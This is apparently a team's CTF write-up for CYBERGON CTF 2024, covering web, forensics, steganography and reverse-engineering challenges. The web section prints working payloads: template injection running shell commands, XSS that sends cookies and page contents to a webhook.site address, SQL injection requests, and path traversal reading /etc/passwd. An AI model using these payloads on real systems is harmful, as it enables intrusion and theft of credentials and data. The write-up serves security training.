# Web Exploitation

## Trickery Number

We are given a website with the `server.js` source code. From the source, we know that to get the flag we have to fulfill  this condition.

```js
  let y = parsedUrl.query.y;
  if (y == null) {
    return sendFile(res, path.join(__dirname, 'null.html'));
  }
  if (y.length > 17) {
    return sendFile(res, path.join(__dirname, 'no-flag.html'));
  }
  let x = BigInt(parseInt(y));
  if (x < y) {
    let flag = fs.readFileSync("flag.txt", 'utf8')
    return sendFile(res, path.join(__dirname, 'flag.html'), { flag });
  }
```

If y is crafted to cause `BigInt(parseInt(y))` to differ from the actual numerical value of y, the condition `x < y` could be satisfied erroneously. 

For instance:

If y = "9007199254740993" (just above Number.MAX_SAFE_INTEGER), `parseInt(y)` might truncate it, leading to a mismatch.

Flag: `CYBERGON_CTF2024{oH_n0t_Th4t_tRiCk3rY}`

## Greeting

We got a website without its source code, where the website reflected our input

![image](https://hackmd.io/_uploads/ByztWIsXJg.png)

After trial and error, we determined that the website can be exploited using an SSTI (Server-Side Template Injection) vulnerability. However, there is a filter that prevents our input from containing the `(` and `)` characters.

To bypass this restriction, we use the Unicode characters for `(` and `)`, which are `（` and `）`. So the final payload would be something like this:

```
{{ lipsum.__globals__["os"].popen（'cat flag.txt'）.read（） }}
```

![image](https://hackmd.io/_uploads/B1orbIjXke.png)

Flag: `CYBERGON_CTF2024{H3lL0_fRoM_CyBer_GoN_2024}`

## Hidden One

To get the flag, we need to access `/flag.txt` endpoint

![image](https://hackmd.io/_uploads/BJWfTMimJl.png)

Flag: `CYBERGON_CTF2024{n0w_y0u_f0und_m3}`

## DumbBot

We got a website without its source code, and here is the preview of the website

![image](https://hackmd.io/_uploads/BJHvD7kEJl.png)

We can't access `/flag` and `/admin` endpoint but we still can access `/gallery` endpoint

![image](https://hackmd.io/_uploads/Hk4qP7J4Jx.png)

And that endpoint vulnerable to XSS but unfortunately there's CSP

![image](https://hackmd.io/_uploads/S1o6vmyVyx.png)

This is the CSP rule used by the website

```
script-src https://www.google.com/recaptcha/
```

This CSP only allows scripts to load from https://www.google.com/recaptcha/. After doing some research, I got this payload from [HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#abusing-google-recaptcha-js-code)

```
<div
  ng-controller="CarouselController as c"
  ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```

And here's the final payload I used to redirect the cookie to webhook.site

```
/gallery?src=%22%3E%3Cdiv%20ng%2Dcontroller%3D%22CarouselController%20as%20c%22%20ng%2Dinit%3D%22c%2Einit%28%29%22%3E%26%2391%5Bc%2Eelement%2EownerDocument%2EdefaultView%2Eparent%2Elocation%3D%22https%3A%2F%2Fwebhook%2Esite%2F242eaa8c%2Df76a%2D4df7%2Daff8%2Dd481bd8506bd%2F%3F%22%2Bc%2Eelement%2EownerDocument%2Ecookie%5D%5D%3Cdiv%20carousel%3E%3Cdiv%20slides%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%20src%3D%22https%3A%2F%2Fwww%2Egoogle%2Ecom%2Frecaptcha%2Fabout%2Fjs%2Fmain%2Emin%2Ejs%22%3E%3C%2Fscript%3E
```

Submit the path and then wait until we get the cookie

![image](https://hackmd.io/_uploads/H1HTaUiXyg.png)

Use the cookie to be able to access `/admin` endpoint

![image](https://hackmd.io/_uploads/HkGKYmyN1x.png)

The `/admin` endpoint is also vulnerable to XSS, and luckily there is no CSP. This allows us to use a payload like this to fetch the `/flag` endpoint and send the response to a webhook.

```
fetch('/flag').then((r)=>r.text()).then((r)=>window.location.href='https://webhook.site/242eaa8c-f76a-4df7-aff8-d481bd8506bd/'+window.btoa(r))
```

Then, send this final payload to the admin and check our webhook to retrieve the base64-encoded flag

```
/admin?h1dd3nparam-cyBerG0n=%3Cscript%3Efetch%28%27%2Fflag%27%29%2Ethen%28%28r%29%3D%3Er%2Etext%28%29%29%2Ethen%28%28r%29%3D%3Ewindow%2Elocation%2Ehref%3D%27https%3A%2F%2Fwebhook%2Esite%2F242eaa8c%2Df76a%2D4df7%2Daff8%2Dd481bd8506bd%2F%27%2Bwindow%2Ebtoa%28r%29%29%3C%2Fscript%3E
```

![image](https://hackmd.io/_uploads/rkb06IiXkg.png)

```
daffainfo@dapOS:~$ echo 'eyJmbGFnIjoiQ1lCRVJHT05fQ1RGMjAyNHtUaDNfRHVtQl9kVW1CX2IwVCF9In0K' | base64 -d
{"flag":"CYBERGON_CTF2024{Th3_DumB_dUmB_b0T!}"}
```

Flag: `CYBERGON_CTF2024{Th3_DumB_dUmB_b0T!}`

## Agent

We got a website without its source code, and it has a bunch of features like:

- Register
- Login
- View Logs

![image](https://hackmd.io/_uploads/rkQ6FUoQkg.png)

Because the website reflects our `User-Agent` header value, we tried inputting a `'` character, and luckily it triggered a SQL error when we did that

```
Fishy fishy don't be a badboy. But I will give you a tip: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 'REDACTED')' at line 1
```

we immediately exploited the website using `UNION-based SQL Injection`. Here is the result:

- Schema: ctf
- Tables: logs,users
- `logs` Columns: id,IP,user_agent,username
- `users` Columns: id,password,username
- First registered user: 1,admin,CYBERGON_CTF2024{N0w_Ag3nt_PwN3d_Th3_S3rv3r}

![image](https://hackmd.io/_uploads/Hkyuh8sQ1e.png)

Here is the final HTTP request:

```
POST /index.php HTTP/1.1
Host: 46.250.232.141:8001
Content-Length: 50
Content-Type: application/x-www-form-urlencoded
User-Agent: ',(select group_concat(id,username,password) from users where id=1))-- -
Cookie: PHPSESSID=72cf9929f8214b2a81265780f0c4bc13

username=wfefewfwe&password=wfefewfwe&action=login
```

Flag: `CYBERGON_CTF2024{N0w_Ag3nt_PwN3d_Th3_S3rv3r}`

## Event
We got a website without its source code where we could input event name and event date

![image](https://hackmd.io/_uploads/HJYZVIoX1e.png)

Parameter `date` is vulnerable to SQL injection because when we add `'` character, it showed us SQL error output

![image](https://hackmd.io/_uploads/B1G84IiQyl.png)

After doing some trial and error, we analyzed that some characters like space and `--` were removed from our input. But we able to bypass that using tab and `#`

![image](https://hackmd.io/_uploads/HyRpV8iX1x.png)

For examble, in the above image im using UNION-based SQL Injection. Here are some lists of data that I obtained by utilizing SQL injection

- Schema Name: events_db

![Screenshot 2024-12-02 224345](https://hackmd.io/_uploads/HJr7UIo7kg.png)

- Tables: cybergon,events

![image](https://hackmd.io/_uploads/Hkp4IIo71e.png)

- `cybergon` Columns: id,title

![image](https://hackmd.io/_uploads/S1s8ILiXkx.png)

And the flag is located in `title` columns. This is our final payload:

```
11/30/'+'2024'	union	select	1,(select	group_concat(title)	from	cybergon),3,4,5#
```

![image](https://hackmd.io/_uploads/rJv5ULs7kg.png)

Flag: `CYBERGON_CTF2024{SqL_1s_FuN_4nd_E@Sy}`

## Simple Upload

We got a website without its source code where we could upload a file and view its content. However, to view the file content, the website requires a correct hash

![image](https://hackmd.io/_uploads/S1MblDomkl.png)

After doing some research, the website vulnerable to [Hash Length Extension](https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack) attack where we could do path traversal but we still provide valid hashes

In this case, im using https://github.com/iagox86/hash_extender to generate the payload. Here is the command I used to view the contents of `/etc/passwd`:

```
daffainfo@dapOS:~/hash_extender$ ./hash_extender -d test.jpg -s 24c034cd1bbf1ba180a83736312021d58c214d5d -l 6 -f sha1 -a '../../../../../../../../../etc/passwd'
Type: sha1
Secret length: 6
New signature: a8e959b647a3df7dc25a8a6ba8ffc0089918cf83
New string: 746573742e6a706780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000702e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f6574632f706173737764
```

Input the obtained hash and string on the website

![image](https://hackmd.io/_uploads/SkDrgDiX1e.png)

Great! Now we need to find where the flag is located. First, I read `/proc/self/environ` to get the directory name

![image](https://hackmd.io/_uploads/HJQX-Pj7yx.png)

There's an interesting env called `HIDDEN_DIR` and its value is `/x2k8s9`. Use that directory to read the flag. Here is the final payload I used to read the flag

```
daffainfo@dapOS:~/hash_extender$ ./hash_extender -d test.jpg -s 24c034cd1bbf1ba180a83736312021d58c214d5d -l 6 -f sha1 -a '../../../../../../../../../x2k8s9/flag.txt'
Type: sha1
Secret length: 6
New signature: 944771e796caa3499acafab69dbb2e5c6dd0decc
New string: 746573742e6a706780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000702e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f78326b3873392f666c61672e747874
```

![image](https://hackmd.io/_uploads/BJptWDs7kx.png)

Flag: `CYBERGON_CTF2024{L3ngTh_ExtenSI0n_@ttCk}`

## Cybergon Blog

We got a website with its source code. After analyzing the code, We found this vulnerable action:

```php
function custom_profile_update_hook($user_id) {
    if (isset($_POST['custom_option']) && is_array($_POST['custom_option']) && in_array('0', $_POST['custom_option'])) {
        $user = get_user_by('id', $user_id);
            $user->set_role('contributor');
    }
}

add_action('personal_options_update', 'custom_profile_update_hook');
add_action('edit_user_profile_update', 'custom_profile_update_hook');
```

Any user with lower privileges such as `subscriber` can escalate their privileges to `contributor` if that account call the `personal_options_update` action. After escalating their privileges to `contributor`, we need to access http://46.250.232.141:8081/?page_id=5

![image](https://hackmd.io/_uploads/Sy-TmwiQ1l.png)

To do that, we need to register first using this custom registration page http://46.250.232.141:8081/?page_id=4

![image](https://hackmd.io/_uploads/rJWWNDs7yx.png)

Login and try to update the profile, the HTTP request will looks like this

```
POST /wp-admin/profile.php HTTP/1.1
Host: 46.250.232.141:8081
Content-Length: 371
Content-Type: application/x-www-form-urlencoded
[SNIP]

_wpnonce=203d9356f2&_wp_http_referer=%2Fwp-admin%2Fprofile.php&from=profile&checkuser_id=2&color-nonce=7d19de06a6&admin_color=fresh&admin_bar_front=1&user_login=ewfefwfwefewfew&first_name=&last_name=&nickname=ewfefwfwefewfew&display_name=ewfefwfwefewfew&email=&url=&description=&pass1=&pass2=&custom_field=1&action=update&user_id=2&submit=Update+Profile
```

Then add `&custom_option[]=0` to the body to escalate the privileges from `subscriber` to `contributor`

![image](https://hackmd.io/_uploads/ryl9QmkN1g.png)

Now we have the `contributor` role! Reaccess http://46.250.232.141:8081/?page_id=5 post to retrieve the flag

![image](https://hackmd.io/_uploads/B1vrXm141l.png)

Flag: `CYBERGON_CTF2024{w0rdpr3ss_vUlN_1s_FuN_4nd_3asy}`

## CybergonBlog2

We got a website with its source code. After analyzing the code, We found this vulnerable action

```php
public function read_post_data() {
    check_ajax_referer('read_post_data_nonce', 'nonce');

    $post_id = isset($_POST['post_id']) ? intval($_POST['post_id']) : 0;
    $post = get_post($post_id);

    if (is_admin() && $post) {
        wp_send_json_success(['post_data' => [
            'title'   => $post->post_title,
            'content' => $post->post_content,
        ]]);
    } else {
        wp_send_json_error(['message' => 'Unauthorized or post not found']);
    }
}
```

`read_post_data` action will read the post title and its content, even if the status of the post is private or draft. But to be able to use this action, we need to provide valid nonce. To generate valid nonce, we can use `generate_nonce` action:

```php
public function generate_nonce() {
    if (is_admin()) {
        $nonce = wp_create_nonce('read_post_data_nonce');
        wp_send_json_success(['nonce' => $nonce]);
    } else {
        wp_send_json_error(['message' => 'Unauthorized']);
    }
}
```

To do that, we need to register first using this custom registration page http://46.250.232.141:8082/?page_id=4 and then login

![image](https://hackmd.io/_uploads/HyXiBX1EJg.png)

After login, generate the nonce by calling `generate_nonce` action

![image](https://hackmd.io/_uploads/BJgBLm1Ekx.png)

After obtaining a valid nonce, call `read_post_data` action and then locate the post that contains the flag

![image](https://hackmd.io/_uploads/SkuFLQJVJe.png)

Flag: `CYBERGON_CTF2024{W0rdPr3ss_1s_FuN_W4s_1t?}`

# Digital Forensics

## Badboy

## Badboy1

Inside `/Users/testing/Downloads/backupemls` directory, there are multiple email file. After reviewing each file individually, We got 2 suspicious email that contains QR code

First email:
![image](https://hackmd.io/_uploads/S133erimye.png)

Second email:
![image](https://hackmd.io/_uploads/SJ5qeHiXkl.png)

If we scan that QR code, it will redirect us to a malicious website which if accessed will directly download malware to our device

This method is called QR Phishing or `Quishing`. And then if we check the email header, we got the email service name which is `emkei.cz`

```
[SNIP]
Received-SPF: None (protection.outlook.com: movietheratre.com does not
 designate permitted sender hosts)
Received: from emkei.cz (114.29.236.247) by
 CH1PEPF0000AD83.mail.protection.outlook.com (10.167.244.85) with Microsoft
 SMTP Server (version=TLS1_3, cipher=TLS_AES_256_GCM_SHA384) id 15.20.8182.16
 via Frontend Transport; Wed, 27 Nov 2024 16:13:39 +0000
[SNIP]
```

Flag: `CYBERGON_CTF2024{emkei_quishing}`

## Badboy2

We download the malicious file into the `/Users/testing/Downloads` directory, and then we upload it to VirusTotal:

https://www.virustotal.com/gui/file/fe321e33dd29bcc7dba51d40283cde9f3cb7bc50cb1b3674387f4dfbc93c7d18/details

First, we got the original filename which is `ab.exe`

![image](https://hackmd.io/_uploads/ByD_Erj7yx.png)

Second, we got the SHA1 hash in VirusTotal `details` tab

![image](https://hackmd.io/_uploads/H1yFBBsmJg.png)

Third, we got the IP:PORT was used to download from the QR code which is `192.168.1.49:8080`

```
daffainfo@dapOS:~$ curl 'https://qr.codes/1iHgbm' -I
HTTP/2 302
date: Mon, 02 Dec 2024 14:15:10 GMT
content-type: text/html; charset=UTF-8
location: http://192.168.1.49:8080/MovieTheratre.exe
[SNIP]
```

Flag: `CYBERGON_CTF2024{ab.exe_d87d087f87650f8ef030728160ec445160884c51_192.168.1.49:8080}`

## Warm Up

For this challenge we have to look up the timezone of the device, we can search this information using `SYSTEM & SOFTWARE` registry. First of all we look up in this path of SYSTEM registry `SYSTEM\ControlSet001\Control\TimeZoneInformation` to find out the time zone 

`SYSTEM\ControlSet001\Control\TimeZoneInformation`
![image](https://hackmd.io/_uploads/BkBxTL671g.png)

after that we have to search up the software timezone databases that related to Singaporean Time zone in the `SOFTWARE` Registry in this path. 

`SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zones\Singapore Standard Time`
![image](https://hackmd.io/_uploads/ryK6T86Q1x.png)

CYBERGON_CTF2024{UTC+08:00 Kuala Lumpur, Singapore}


## DFIR (1)

In this challenge, we have to look up after the device hostname and device owner's username. In this case, we can search that information on the registry, specifically in the `SYSTEM` registry. Before i search it, i load all the log file of that registry so it can be clean when we load into registry explorer. proof below:

![2_systemClean](https://hackmd.io/_uploads/HJB_yB6Xkx.png)

To search the hostname/computername information in that registry, we can search it in this path`[ROOT]/ControlSet/Control/ComputerName/ComputerName`. As we can see below image that the Computer Host Name is WHITE-PARTY 

![2_computerName](https://hackmd.io/_uploads/HkBu1H6Xyg.png)

Next on, we have to seach the username of the devices, we can easily search it in the users directory and the directory name in it is the asnwer. Proof below 
![2_Username](https://hackmd.io/_uploads/rkHO1S67yl.png)

Flag: `CYBERGON_CTF2024{WHITE-PARTY, Sean John Combs}`

## DFIR (2)

For this challenge, we have to search about the device's owner facebook id, for searching this facebook id, after analyzing the file, we found out that the user open the facebook through the web application. For website analysis in the disk image file we can focus on the `USERS/[selectedUsers]/AppData/Local/[broswerName]`. First of all, we analyzing the cache file of each broswer directory using `NirSoft CacheFileViewer` and we can sure that it can be for checking the users visited urls. Proof below: 

![chromesuccess](https://hackmd.io/_uploads/HJt0fLTm1g.png)

But when we trace all of that, we cant parse the mozilla cache data entries. And from here we dumpp of all the mozilla directory and analyzing manual using grep command in linux. Proof below

![entriesfailed](https://hackmd.io/_uploads/ryRoz86mke.png)

before that, we do some research that facebook have its own templating for the users profile. We found it like this.

![idexplain](https://hackmd.io/_uploads/BkCoz86X1l.png)

because of that, we can use grep command to search about that facebook id in the mozilla directory. using this command:

```shell
grep -air facebook.com |  grep -E '[0-9]{14}'
```

the first grep command search all recursively with case insensitive and match binary file that contain word "facebook.com" and the second grep command is activate the regex function in regex that search numeric value with 14 digits of numbers. After do some try and error we found the correct id and his profile page. Proof below:

![stringsgrepfacebook](https://hackmd.io/_uploads/SkRszUTXJg.png)
![diddyfacepage](https://hackmd.io/_uploads/r1mcZUamke.png)

Flag: `CYBERGON_CTF2024{61567849079733, East Coast Rapper}`

## DFIR (3)

In this challenge we need to know the owner's nickname. When we analyze this .ad1 file, we notice that the owners nickname rely with Windows Security Question in the registry. If we use autopsy for analyzing it can be seen OS Account detail -> Host detail and already got the answer. 

![3_secQuesAutpsy](https://hackmd.io/_uploads/By115A5X1g.png)

but if we use ftk imager we need to extraxct `SAM registry hive`, open it with registry explorer and search that value in this path `SAM\Domains\Account\Users` 
![image](https://hackmd.io/_uploads/HkrsqAqX1l.png)

Flag: `CYBERGON_CTF2024{Ko Toke Gyi}`


## DFIR (11)

In this challenge, we need to find the flag based on the owner's facebooks's friend post that posting about him. So in this case we can check through the owner's facebook page that we already got previously and check the friend's tab -> following. 

![4_followingPage](https://hackmd.io/_uploads/SJmzRC57Jl.png)

After search it, the whole following friend, we got something interesting with this account [link](https://www.facebook.com/Lwaneainko). Refer to this post, [Link](https://www.facebook.com/share/p/1EjRWT2jBK/)
and from that post, we analyze it and found the flag rely in the post edit history. Even though there are some fake flag, we noticed that the real flag was in the same format as before. 

![image](https://hackmd.io/_uploads/rJ43gysmke.png)


Flag: `CYBERGON_CTF2024{s0c14L_m3d14_O51n7!!!!!}`

# Stegano

## Invisible

Given an image file `challenge1.jpg`, let's try find something using [Aperisolve](https://www.aperisolve.com).

There's something interesting in the `Red` section.

![image](https://hackmd.io/_uploads/HkrJTaYmke.png)

We can see that there's `getyourflag` on the bottom left of the picture.

let's try using `steghide extract -sf challenge1.jpg` and `getyourflag` as the passphrase

and we got a `flag.txt` file

Flag: `CYBERGON_CTF2024{n07h1ng_5t4ys_h1dd3n}`

## Truesight

We are given a png file but is corrupted.

let's try checking it using a hexeditor

![image](https://hackmd.io/_uploads/r1YmCatmye.png)

As expected, we're missing the first 8 bytes of the png header. let's try adding it

![image](https://hackmd.io/_uploads/r1Z_CpFQJx.png)

Save it and we can now view the png file

![image](https://hackmd.io/_uploads/SyZ5ATFmkl.png)

flag: `CYBERGON_CTF2024{y0u_g07_7h3_r!gh7_s1gn5}`

## What's behind the wall ?

We are given an image `challenge4.jpg` and a `JS.txt` file from the challenge.

Let's try check the image metadata first using `exiftool`

```
ExifTool Version Number         : 13.00
File Name                       : challenge4.jpg
Directory                       : .
File Size                       : 180 kB
File Modification Date/Time     : 2024:09:28 01:28:53+07:00
File Access Date/Time           : 2024:11:30 18:33:47+07:00
File Inode Change Date/Time     : 2024:11:30 18:33:49+07:00
File Permissions                : -rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 72
Y Resolution                    : 72
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0232
Components Configuration        : Y, Cb, Cr, -
User Comment                    : winteriscoming
Flashpix Version                : 0100
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1080
Megapixels                      : 2.1
```

I saw `winteriscoming` on user comment, maybe we can use it for something related to txt files. since there is nothing else we can do by using jpg files. let's try to find some steganography tools related to Text.

After some research, I found a tool called `Snow` and it's for a text-based steganography. let's try using it

Command:
`./SNOW.EXE -C -p "winteriscoming" JS.txt`

Output:
`3X1f_w1th_5n0w5`

flag: `CYBERGON_CTF2024{3X1f_w1th_5n0w5}`

## Black Myth

If we upload the image to [StegOnline](https://georgeom.net/StegOnline/image) and apply the full alpha filter, we will notice some pixels (particularly along the black vertical line) with an alpha channel value not equal to 255.
![image](https://hackmd.io/_uploads/r1uvjxjX1e.png)

So i tried to extract only alpha channels of the images using below python PIL script

```python=
from PIL import Image

image = Image.open("Wukong.png")

for x in range(image.width):
    for y in range(image.height):
        pixel = image.getpixel((x, y))
        if pixel[-1] != 255:
            print(pixel[-1], end=" ")
            
# Output: 152 124 153 150 133 148 138 139 118 152 131 149 193 195 193 191 82 153 194 191 112 142 118 100 124 188 105 118 88 130 102 195 139 108 214 214 214 80 
```

Because we know the flag format, i tried to map every characters on the flag format (`CYBERGON_CTF2024{`) to the alpha channels value.

```python=
from PIL import Image

image = Image.open("Wukong.png")
pixelAlpha = []

for x in range(image.width):
    for y in range(image.height):
        pixel = image.getpixel((x, y))
        if pixel[-1] != 255:
            pixelAlpha.append(pixel[-1])

format = "CYBERGON_CTF2024{"
map = {}

for i in range(len(format)):
    map[pixelAlpha[i]] = format[i]

map[pixelAlpha[-1]] = '}'

for i in pixelAlpha:
    try:
        print(map[i], end="")
    except:
        print("?", end="")

# Output: CYBERGON_CTF2024{B?4??_?Y??_???0N????}
```

From that output, my teammate guessed that the string might be "BLACK_MYTH_WUKONG" based on the known string above.

```
mapping output: CYBERGON_CTF2024{B?4??_?Y??_???0N????}
guessed string: CYBERGON_CTF2024{BL4CK_MYTH_WUK0NG???}
```

We can make the guesse string cleaner by using below method:

- Character `C` is already mapped correctly, so it should be `BL4cK` not `BL4CK`
**update**: CYBERGON_CTF2024{BL4cK_MYTH_WUK0NG???}
- Character `T` is already mapped correctly, so it should be `MYtH` not `MYTH`
**update**: CYBERGON_CTF2024{BL4cK_MYtH_WUK0NG???}
- Character `G` is already mapped correctly, so it should be `WUK0Ng` not `WUK0NG`
**update**: CYBERGON_CTF2024{BL4cK_MYtH_WUK0Ng???}

From the new updated guessed string. I analyzed it more deeper and i found interesting pattern between the alpha channels value and the actual flag characters.

```python=
from PIL import Image

image = Image.open("Wukong.png")
pixelAlpha = []

for x in range(image.width):
    for y in range(image.height):
        pixel = image.getpixel((x, y))
        if pixel[-1] != 255:
            pixelAlpha.append(pixel[-1])

format = "CYBERGON_CTF2024{"
map = {}

for i in range(len(format)):
    map[pixelAlpha[i]] = format[i]

map[pixelAlpha[-1]] = '}'

for i in pixelAlpha:
    try:
        print(map[i], end="")
    except:
        print("?", end="")
        
cleaned = "CYBERGON_CTF2024{B?4c?_?Yt?_???0Ng???}"
for i in range(len(cleaned)):
    if cleaned[i] != '?':
        map[pixelAlpha[i]] = cleaned[i]

print(map)

# Output: {152: 'C', 124: 'Y', 153: 'B', 150: 'E', 133: 'R', 148: 'G', 138: 'O', 139: 'N', 118: '_', 131: 'T', 149: 'F', 193: '2', 195: '0', 191: '4', 82: '{', 80: '}', 112: 'c', 188: 't', 108: 'g'}
```

We can see the pattern that 

- `map[152] = 'C'` and `map[102] = 'c'` 

We know that uppercase and lowercase characters have a difference of ~50 (assumption).

- `map[124] = 'Y'` and `map[150] = 'E'` and `map[152] = 'C'` and `map[153] = 'B'`
We can get the alpha value range for uppercase characters, it should be around 154 ('A') until 123 ('Z'). Beacuse we already know that uppercase and lowercase characters have a difference of  ~50, we can get the alpha value range for lowercase characters, it should be around 104 ('a') until 73 ('z').

After that, we have to analyze the digits characters too. From the first mapping, we know that `map[193] = '2'` and `map[195] = '0'` and `map[191] = '4'` (taken from flag format ~~CYBERGON_CTF~~2024). From that sequence, we can make string digits mapping to alpha values.

| Digits | Alpha Channel Value |
|-------|-------|
| 0     | 195   |
| 1     | 194   |
| 2     | 193   |
| 3     | 192   |
| 4     | 191   |
| 5     | 190   |
| 6     | 189   |
| 7     | 188   |
| 8     | 187   |
| 9     | 186   |

Now, make new mapping based on what we've found before.

```python=
from PIL import Image

image = Image.open("Wukong.png")
pixelAlpha = []

for x in range(image.width):
    for y in range(image.height):
        pixel = image.getpixel((x, y))
        if pixel[-1] != 255:
            pixelAlpha.append(pixel[-1])

format = "CYBERGON_CTF2024{"
map = {}

for i in range(len(format)):
    map[pixelAlpha[i]] = format[i]

map[pixelAlpha[-1]] = '}'

cleaned = "CYBERGON_CTF2024{B?4c?_?Yt?_???0Ng???}"
for i in range(len(cleaned)):
    if cleaned[i] != '?':
        map[pixelAlpha[i]] = cleaned[i]

guessed_cleaned = "CYBERGON_CTF2024{BL4cK_MYtH_WUK0Ng???}"
for i in range(len(guessed_cleaned)):
    if pixelAlpha[i] <= 154 and pixelAlpha[i] >= 123:
        print(guessed_cleaned[i].upper(), end="")
    elif pixelAlpha[i] <=  104 and pixelAlpha[i] >= 73:
        print(guessed_cleaned[i].lower(), end="")
    elif pixelAlpha[i] <=  195 and pixelAlpha[i] >= 186:
        print(chr(ord('0') + 195 - pixelAlpha[i]), end="")
    else:
        print(guessed_cleaned[i], end="")

        
# Output: CYBERGON_CTF2024{B14cK_mY7H_wUk0Ng???}
```
There are only one character that have'nt mapped, the alpha value is 214 so it should be a symbol that have ASCII lower than `0` because `0` has alpha value 195. So ASCII character from alpha value 214 should be lower than character `0`. The most possible character is `!`. 


Flag: `CYBERGON_CTF2024{B14cK_mY7H_wUk0Ng!!!}`

## The Tesla Machine

Given two photos that look identical.
![image](https://hackmd.io/_uploads/S1KIQesQ1e.png)

So to find the differences, i compare all the pixels between both images and i tried to xor each different pixel from both photos. I used PIL on python library. 

```python=
from PIL import Image

image1 = Image.open("Robert Angier 1.png")
image2 = Image.open("Robert Angier 2.png")

for x in range(image1.width):
    for y in range(image1.height):
        pixel1 = image1.getpixel((x, y))
        pixel2 = image2.getpixel((x, y))
    
        if pixel1 != pixel2:
            for i in range(3):
                if pixel1[i] != pixel2[i]:
                    print(chr(pixel1[i] ^ pixel2[i]), end="")
                    break
```

Flag: `CYBERGON_CTF2024{Y0u_G07_r341_0n3}`

# Reverse Engineering

## buggy

Open the given binary on IDA, at the beginning of the `main` function, there is `sub_1B30` function call. After analyze it, `sub_1B30` initialize Mersenne Twister PRNG state with `0xDABCAD` as a seed then generating 256 random 4 bytes integer.
![image](https://hackmd.io/_uploads/rJKx2pqQJx.png)
![image](https://hackmd.io/_uploads/H1uAn69Qkg.png)

Then after generating 256 number, the child process created from `fork()` encrypts the user input that has been padded. The encryption method uses xor method like below.

```
Input     : CYBE (encrypting each 4 bytes)
Output    : xor(CYBE, mt[ord("C")])
```

After that the program compare the user input with the encrypted_flag.
![image](https://hackmd.io/_uploads/BkS_WA5Qke.png)

I use GDB to dump all of the encrypted flag from `unk_3080` in .rodata section.
![image](https://hackmd.io/_uploads/HkLWMR9mkx.png)

Extract them into python list.

```python
enc_flag = [
    0x190BED96,
    0x8B0303D9,
    0x876B08F1,
    0xE282138B,
    0xDA1E38DC,
    0xAA878B06,
    0x4F102F51,
    0xC1F9A192,
    0xCB8A1FB6,
    0xFC4C2534,
    0xA2010CD9,
    0xC04D63C2,
]
```

But there is an anomaly here, the comparison process compares the user input before encrypted. But we figured it out that`sub_1B30` is called twice, the first one use `0xDABCAD` as a seed and the second one use `0xBADCAD` as a seed. The second 256 random number list is never used by the program so i speculated that i should use the second random number list considering the name of the challenge is `buggy`. I reconstruct the encryption process on a python code and recover the flag by bruteforcing the xor_key from the generated list.

```python=
from Crypto.Util.number import bytes_to_long, long_to_bytes

enc_flag = [
    0x190BED96,
    0x8B0303D9,
    0x876B08F1,
    0xE282138B,
    0xDA1E38DC,
    0xAA878B06,
    0x4F102F51,
    0xC1F9A192,
    0xCB8A1FB6,
    0xFC4C2534,
    0xA2010CD9,
    0xC04D63C2,
]

class MersenneTwister:
    def __init__(self, seed):
        self.state = [0] * 624
        self.index = 0
        self.state[0] = seed
        for i in range(1, 624):
            self.state[i] = (0x6C078965 * (self.state[i - 1] ^ (self.state[i - 1] >> 30)) + i) & 0xFFFFFFFF

    def gen(self):
        if self.index == 0:
            for i in range(624):
                y = (self.state[i] & 0x80000000) + (self.state[(i + 1) % 624] & 0x7FFFFFFF)
                self.state[i] = self.state[(i + 397) % 624] ^ (y >> 1)
                if y % 2 != 0:
                    self.state[i] = self.state[i] ^ 0x9908B0DF
        
        y = self.state[self.index]
        y = y ^ (y >> 11)
        y = y ^ ((y << 7) & 0x9D2C5680)
        y = y ^ ((y << 15) & 0xEFC60000)
        y = y ^ (y >> 18)
        self.index = (self.index + 1) % 624
        return y

sb = []
mt = MersenneTwister(0xBADCAD)
for i in range(256):
    sb.append(mt.gen())

for enc in enc_flag:
    for k in sb:
        try:
            temp = long_to_bytes((enc ^ k) & 0xFFFFFFFF)
            xor_key = sb[bytes_to_long(temp) & 0xFF]
            if int.from_bytes(temp, byteorder="big") ^ xor_key != enc:
                raise Exception
            print(temp[::-1].decode(), end="")
        except:
            pass
        
```

To recover the flag, i tried to enumerate all the value from the generated `sb` list and xor it with `enc` so i got the 4 bytes plain data. To verify if the plain data is the correct one, i encrypt the plain data and compare it with the encrypted one, if both of them are equal, the plain data is the correct one.

Flag: `CYBERGON_CTF2024{Py36KRDVw%1+BGn1n)J]xdvRHMg;@}`

## Hash Hash Hash...

Open the binary with IDA, after analyzing the binary, the program hashes the user input then compare it with the flag hash.
![image](https://hackmd.io/_uploads/rynkMko71x.png)

There is also input length validation. it shows that the input length must be 0x30 or 48 in decimal.
![image](https://hackmd.io/_uploads/ry2uwysXJx.png)

To get the flag hash, i use GDB to dump the actuall flag hash.
![image](https://hackmd.io/_uploads/ByheuJsQJl.png)
```py
enc_flag = [
    0x0380BB5B,
    0xCE0ACB02,
    0x89F8DB58,
    0x47D24019,
    0x560EEFBE,
    0x2E41D64E,
    0x9E0E14EB,
    0xEB33ABA8,
    0x67739FF5,
    0x8C9A5B38,
    0xEEA329C8,
    0xE97BC2E9,
]
```


The hash function seems to be a custom one. It uses `0xC0FFEE` as the initial value. Inside the hash function, the program generates 256 four bytes integer and store all of them inside an array (`gen_array`).
![image](https://hackmd.io/_uploads/HyHEU1smyl.png)

After that, the program use that generated array for further hashing process as below.
